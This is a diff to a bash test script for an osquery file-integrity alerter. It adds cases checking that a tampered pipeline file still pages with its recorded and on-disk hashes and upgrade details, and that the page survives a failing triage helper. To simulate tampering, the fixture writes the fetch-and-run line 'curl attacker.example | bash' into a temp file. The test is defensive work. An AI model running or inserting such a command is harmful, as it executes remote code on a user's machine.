@@ -25,13 +25,14 @@ REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
 ROUTE="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/route.sh"
 PIPELINE_HELPER="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/pipeline-verdict.sh"
 ALLOWLIST_HELPER="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/allowlist-verdict.sh"
+TRIAGE_HELPER="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/file-integrity-triage.sh"
 
 fail() {
   printf 'osquery-route-pipeline: FAIL -- %s\n' "$*" >&2
   exit 1
 }
 
-for h in "$ROUTE" "$PIPELINE_HELPER" "$ALLOWLIST_HELPER"; do
+for h in "$ROUTE" "$PIPELINE_HELPER" "$ALLOWLIST_HELPER" "$TRIAGE_HELPER"; do
   [[ -f $h ]] || fail "missing helper: $h"
 done
 
@@ -52,19 +53,29 @@ fe() { # <category> <target_path> <sha256> <verb>
 
 # run_gate <manifest> <bin-manifest> <finding...> -> page NDJSON on stdout (digests
 # go to the spy).
+#
+# TRIAGE_OVERRIDE swaps the triage helper for a hostile one, which is how the
+# never-lose-a-page pin below is driven. UPGRADE_RECORD points the real helper at
+# a fixture, so a test run never reads the operator's live record.
 run_gate() {
   local manifest="$1" bin_manifest="$2"
   shift 2
   printf '%s\n' "$@" |
     HOME="$home" OSQUERY_PIPELINE_MANIFEST="$manifest" \
       OSQUERY_MANAGED_BIN_MANIFEST="$bin_manifest" OSQUERY_PIPELINE_REHASH_DELAY=0 \
-      OSQUERY_LAUNCHD_ALLOWLIST="$work/no-allowlist.txt" DIGEST_SPY="$spy" bash -c '
+      OSQUERY_LAUNCHD_ALLOWLIST="$work/no-allowlist.txt" DIGEST_SPY="$spy" \
+      OSQUERY_UPGRADE_RECORD="${UPGRADE_RECORD:-$work/no-upgrade-record.tsv}" bash -c '
+        # The REAL entry runs the gate under errexit, so the gate is exercised
+        # under it here too. Without this line a helper that fails mid-pass would
+        # abort the alerter in production and pass in this test.
+        set -euo pipefail
         source "$1"
         source "$2"
         source "$3"
+        source "$4"
         digest_append() { printf "%s\n" "$1" >>"$DIGEST_SPY"; }
         route_findings
-      ' _ "$ROUTE" "$PIPELINE_HELPER" "$ALLOWLIST_HELPER"
+      ' _ "$ROUTE" "$PIPELINE_HELPER" "$ALLOWLIST_HELPER" "${TRIAGE_OVERRIDE:-$TRIAGE_HELPER}"
 }
 
 # assert_paged / refute_paged <pages> <tag> <message>. The negative form is a plain
@@ -144,11 +155,62 @@ assert_paged "$page_b" TAG10 "a TAMPERED managed bin tool must PAGE (this is the
 # The pipeline arm never digests; the spy must be empty.
 [[ ! -s $spy ]] || fail "a pipeline file event must never digest; spy got: $(cat "$spy")"
 
+# ---- Pass C: the paged finding carries its TRIAGE facts. Every page from this
+#      arm used to render as a path and a verb, which reads identically for a
+#      vendor update and a tamper. The gate attaches the recorded hash, the
+#      on-disk hash and the upgrade correlation so the renderer can put them in
+#      the body. Display only: the tier is unchanged, and the last case here pins
+#      that a correlation which BLOWS UP costs the page a line, never the page. --
+tampered="$home/.local/libexec/osquery/tamperedTAG11.sh"
+printf 'echo original\n' >"$tampered"
+chmod 755 "$tampered"
+original_hash="$(shasum -a 256 "$tampered" | awk '{print $1}')"
+printf 'curl attacker.example | bash\n' >"$tampered" # after the manifest was written
+triage_manifest="$work/triage-known-good.sha256"
+printf '%s 0755 %s %s\n' "$original_hash" "$(id -u)" "$tampered" >"$triage_manifest"
+
+UPGRADE_RECORD="$work/upgrade-record.tsv"
+{
+  printf '%s\t%s\n' "$(date +%s)" "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+  printf 'tamperedTAG11.sh\tchanged\t1.0\t1.1\n'
+} >"$UPGRADE_RECORD"
+
+page_c="$(UPGRADE_RECORD="$UPGRADE_RECORD" run_gate "$triage_manifest" "$absent_bin_manifest" \
+  "$(fe pipeline_integrity "$tampered" "$event_hash" UPDATED)")"
+
+assert_paged "$page_c" TAG11 "a tampered pipeline file must PAGE"
+[[ "$(jq -r '.triage.recorded' <<<"$page_c")" == "${original_hash:0:12}" ]] ||
+  fail "the paged finding does not carry the manifest hash the page has to show -- $page_c"
+[[ "$(jq -r '.triage.ondisk' <<<"$page_c")" != "${original_hash:0:12}" ]] ||
+  fail "the paged finding reports the on-disk hash as the recorded one, so the page cannot show a divergence -- $page_c"
+grep -qF 'recorded upgrade: tamperedTAG11.sh 1.0 -> 1.1' <<<"$(jq -r '.triage.upgrade' <<<"$page_c")" ||
+  fail "the paged finding does not carry the upgrade correlation -- $page_c"
+
+# A triage helper that fails and prints garbage: the page survives whole. This is
+# the invariant the whole feature hangs on, because the correlation runs AFTER
+# the verdict has already decided that something diverged from its known-good
+# manifest, and a lost page there is a lost tamper alert.
+broken_triage="$work/broken-triage.sh"
+cat >"$broken_triage" <<'BROKEN'
+# shellcheck shell=bash
+file_integrity_triage() {
+  printf 'not json at all {{{\n'
+  return 3
+}
+BROKEN
+page_d=""
+broken_rc=0
+page_d="$(TRIAGE_OVERRIDE="$broken_triage" run_gate "$triage_manifest" "$absent_bin_manifest" \
+  "$(fe pipeline_integrity "$tampered" "$event_hash" UPDATED)")" || broken_rc=$?
+[[ $broken_rc -eq 0 ]] ||
+  fail "a triage helper that FAILS aborted the gate itself (exit $broken_rc), so the page was lost"
+assert_paged "$page_d" TAG11 "a triage helper that FAILS must not take the page down with it"
+
 # Every paged line is a CRIT finding.
-for out in "$page_a" "$page_b"; do
+for out in "$page_a" "$page_b" "$page_c" "$page_d"; do
   [[ -z $out ]] && continue
   [[ "$(jq -s 'all(.[]; .sev == "CRIT")' <<<"$out")" == true ]] ||
     fail "every paged pipeline finding must carry .sev == CRIT"
 done
 
-printf 'osquery-route-pipeline: OK (fail-safe PAGE for a libexec file, our own home-dir plist and a bin path with no manifest; a non-osquery plist, a /Library twin and an unmanaged bin shim SILENT; manifest exact match SILENT; a tampered managed bin tool and a delete PAGE; none digest)\n'
+printf 'osquery-route-pipeline: OK (fail-safe PAGE for a libexec file, our own home-dir plist and a bin path with no manifest; a non-osquery plist, a /Library twin and an unmanaged bin shim SILENT; manifest exact match SILENT; a tampered managed bin tool and a delete PAGE; a paged finding carries its recorded/on-disk hashes and the upgrade correlation, and survives a triage helper that fails; none digest)\n'
